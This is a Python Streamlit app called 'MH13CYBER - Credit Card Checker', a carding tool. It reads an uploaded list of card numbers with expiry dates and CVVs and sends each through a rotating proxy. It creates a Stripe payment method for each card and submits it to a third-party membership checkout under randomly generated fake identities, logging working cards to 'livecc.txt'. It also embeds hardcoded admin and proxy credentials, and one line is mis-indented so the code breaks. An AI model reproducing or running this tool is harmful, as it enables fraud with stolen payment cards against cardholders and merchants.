import streamlit as st
import requests
import random
import string
import json
import os

# File to store user details
user_file = 'user_details.json'

# Load user details if the file exists
if os.path.exists(user_file):
    with open(user_file, 'r') as file:
        users = json.load(file)
else:
    users = {}

# Function to save user details
def save_users():
    with open(user_file, 'w') as file:
        json.dump(users, file)

# Admin credentials
admin_username = "admin"
admin_password = "password"

# Streamlit UI
st.title("MH13CYBER - Credit Card Checker")

# Admin login
if "admin_logged_in" not in st.session_state:
    st.session_state.admin_logged_in = False

# User login
if "user_logged_in" not in st.session_state:
    st.session_state.user_logged_in = False

# Admin Panel
if not st.session_state.admin_logged_in and not st.session_state.user_logged_in:
    with st.form("admin_login_form"):
        st.subheader("Admin Login")
        admin_user = st.text_input("Admin Username")
        admin_pass = st.text_input("Admin Password", type="password")
        admin_login = st.form_submit_button("Login")

        if admin_login:
            if admin_user == admin_username and admin_pass == admin_password:
                st.session_state.admin_logged_in = True
                st.success("Admin logged in successfully!")
            else:
                st.error("Invalid admin credentials")

if st.session_state.admin_logged_in:
    st.subheader("Admin Panel - User Management")

    for username, user_data in users.items():
        user_status = user_data.get("status", "pending")
        col1, col2, col3 = st.columns([2, 1, 1])
        col1.text(username)
        col2.text(user_status)

        if user_status == "pending":
            approve_button = col3.button("Approve", key=f"approve_{username}")
            reject_button = col3.button("Reject", key=f"reject_{username}")

            if approve_button:
                users[username]["status"] = "approved"
                save_users()
                st.experimental_rerun()

            if reject_button:
                users[username]["status"] = "rejected"
                save_users()
                st.experimental_rerun()

    if st.button("Logout Admin"):
        st.session_state.admin_logged_in = False
        st.experimental_rerun()

# User login
if not st.session_state.admin_logged_in:
    with st.form("user_login_form"):
        st.subheader("User Login")
        telegram_username = st.text_input("Enter your Username")
        user_login = st.form_submit_button("Login")

        if user_login and telegram_username:
            if telegram_username not in users:
                # Generate a random user ID for simplicity
                user_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                users[telegram_username] = {"id": user_id, "status": "pending"}
                save_users()
                st.success(f"User {telegram_username} registered and awaiting approval.")
            else:
                user_status = users[telegram_username].get("status", "pending")
                if user_status == "approved":
                    st.session_state.user_logged_in = True
                    st.success(f"Welcome, {telegram_username}!")
                elif user_status == "rejected":
                    st.error(f"User {telegram_username} has been rejected.")
                else:
                    st.warning(f"User {telegram_username} is pending approval.")

if st.session_state.user_logged_in:
    # Upload card list file
    cardlist = st.file_uploader("Upload Card List File", type="txt")
    savelist = st.text_input("Enter path to save live cards", value=r"livecc.txt")

    # Proxy input
    proxy_info = st.text_input("Enter Proxy Information", value="http://povmvtrs-rotate:suljy7ayq24u@p.webshare.io:80")

    # User-Agent and headers for requests
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'

    # Function to generate email and password
    def generate_password(length=8):
        characters = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(characters) for _ in range(length))

        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        username = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
        domain = random.choice(domains)
        email = f"{username}@{domain}"

        return email, password, username

    def find_between(data, first, last):
        try:
            start = data.index(first) + len(first)
            end = data.index(last, start)
            return data[start:end]
        except ValueError:
            return

    def main(cc, mes, ano, cvv):
        response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
        brand_mapping = {
            "VISA": "visa",
            "MASTERCARD": "mc",
            "AMERICAN EXPRESS": "amex",
            "DINERS CLUB": "diners",
            "DISCOVER": "discover"
        }

        response_data = response.json()
        brand = brand_mapping.get(response_data.get("brand", ""))
        
        with requests.Session() as r:
            r.proxies = {"http": proxy_info, "https": proxy_info}
            r.headers.update({'User-Agent': user_agent})
            r.cookies.clear()
            
            url = "https://m.stripe.com/6"
            response = r.post(url)
            resultado13 = response.text
            muid = resultado13.split('"muid":"')[1].split('"')[0].strip()
            sid = resultado13.split('"sid":"')[1].split('"')[0].strip()
            guid = resultado13.split('"guid":"')[1].split('"')[0].strip()
            
            password = generate_password()[1] 
            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
            }

            params = {
                'level': '7',
            }

            response = r.get('https://ecstest.net/membership-checkout/', params=params, headers=headers)
            key = find_between(response.text, 'var pmproStripe = {"publishableKey":"', '","')

            headers.update({
                'Accept': 'application/json',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
            })

            data = {
                'stripe_js_id': '1b4e0fae-ac3e-499f-a312-b37970de73ba',
                'referrer_host': 'ecstest.net',
                'key': key,
                'request_surface': 'web_elements_controller',
            }

            response = r.post('https://merchant-ui-api.stripe.com/elements/wallet-config', headers=headers, data=data)

            arb_id = find_between(response.text, '"arb_id":"', '","')
            
            data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Fc973c0a0ca%3B+stripe-js-v3%2Fc973c0a0ca%3B+split-card-element&referrer=https%3A%2F%2Fecstest.net&time_on_page=1321660&key={key}'

            response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

            id = response.json()['id']
            
            headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://ecstest.net',
                'Referer': 'https://ecstest.net/membership-checkout/?level=7',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
            })

                        account_number = "X" * 12 + cc[-4:]
            password = generate_password()[1]
            email = generate_password()[0]

            data = [
                ('level', '7'),
                ('checkjavascript', '1'),
                ('username', generate_password()[2]),
                ('password', password),
                ('password2', password),
                ('bemail', email),
                ('bconfirmemail', email),
                ('fullname', ''),
                ('gateway', 'stripe'),
                ('CardType', brand),
                ('submit-checkout', '1'),
                ('javascriptok', '1'),
                ('submit-checkout', '1'),
                ('javascriptok', '1'),
                ('payment_method_id', id),
                ('AccountNumber', account_number),
                ('ExpirationMonth', mes),
                ('ExpirationYear', ano),
            ]

            response = r.post('https://ecstest.net/membership-checkout/', params=params, headers=headers, data=data)
            response_text = response.text
            result = find_between(response_text, ' id="pmpro_message" class="pmpro_message pmpro_error">', '</div>')

            st.write(f'{result} : {cc}|{mes}|{ano}|{cvv}')
            output_string = f"{cc}|{mes}|{ano}|{cvv} --->> {result} ]n"
            with open(savelist, "a") as file:  # add live save path
                file.write(output_string)

    if cardlist is not None:
        for line in cardlist:
            cc, mes, ano, cvv = line.strip().decode("utf-8").split("|")
            main(cc, mes, ano, cvv)

if not st.session_state.admin_logged_in and not st.session_state.user_logged_in:
    st.warning("Please log in to continue.")

